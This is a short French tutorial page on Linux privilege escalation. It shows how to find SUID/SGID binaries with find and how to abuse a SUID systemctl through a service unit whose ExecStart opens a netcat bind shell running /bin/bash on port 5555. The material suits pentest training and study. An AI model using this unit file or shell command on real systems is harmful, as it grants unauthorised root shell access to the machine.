---
title: "Eth Piracy: *Nix Privilege Escalation"
---

<p style="text-align: right">_- last update 07/11/2021 -_</p>

## Vulnérabilité SUID / SGID

Tout le process qui suit à été entièrement automatisé par le script [AutoSUID](https://github.com/IvanGlinkin/AutoSUID).

Liste tous les fichiers qui ont soit le bit SGID ou SUID activé, ignorer les
erreurs et exporter le résultat dans un fichier.

```bash
find / -perm -4000 -o -perm -2000 -exec ls -ldb {} \; 2>/dev/null | tee output
```

Explication :
```txt
find \                # lister tout les fichiers
  / \                 # depuis la racine
  -perm -4000 \       # qui ont le bit SUID d'activer
  -o \                # OU (-or)
  -perm -2000 \       # le bit SGID d'activé
  -exec ls -ldb {} \; # pour chaque fichier, afficher en uilisant la commande ls
```

Pour lister uniquement le nom des binaires à partir du fichier `output`:
```bash
cat output | rev | cut -d '/' -f 1 | rev | sort -u
```

Une fois qu'on a trouvé un binaire intéressant chercher une potentielle 
exploitation depuis le site [GTFOBins](https://gtfobins.github.io/).


### Systemctl

[GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/) nous donne un POC
qui exécute la commande `id`. Pour obtenir un shell, cela demande quelques
modifications.

Par exemple, si netcat est disponible:

```txt
[Service]
Type=oneshot
ExecStart=/bin/sh -c "nc -lp 5555 -e /bin/bash"
[Install]
WantedBy=multi-user.target
```

Attention, la version netcat de openbsd n'a pas d'option exec (`-e`). Il existe
un moyen de faire décrit [dans cet article](https://morgawr.github.io/hacking/2014/03/29/shellcode-to-reverse-bind-with-netcat) 
(chercher `openbsd`) mais je n'ai pas testé.
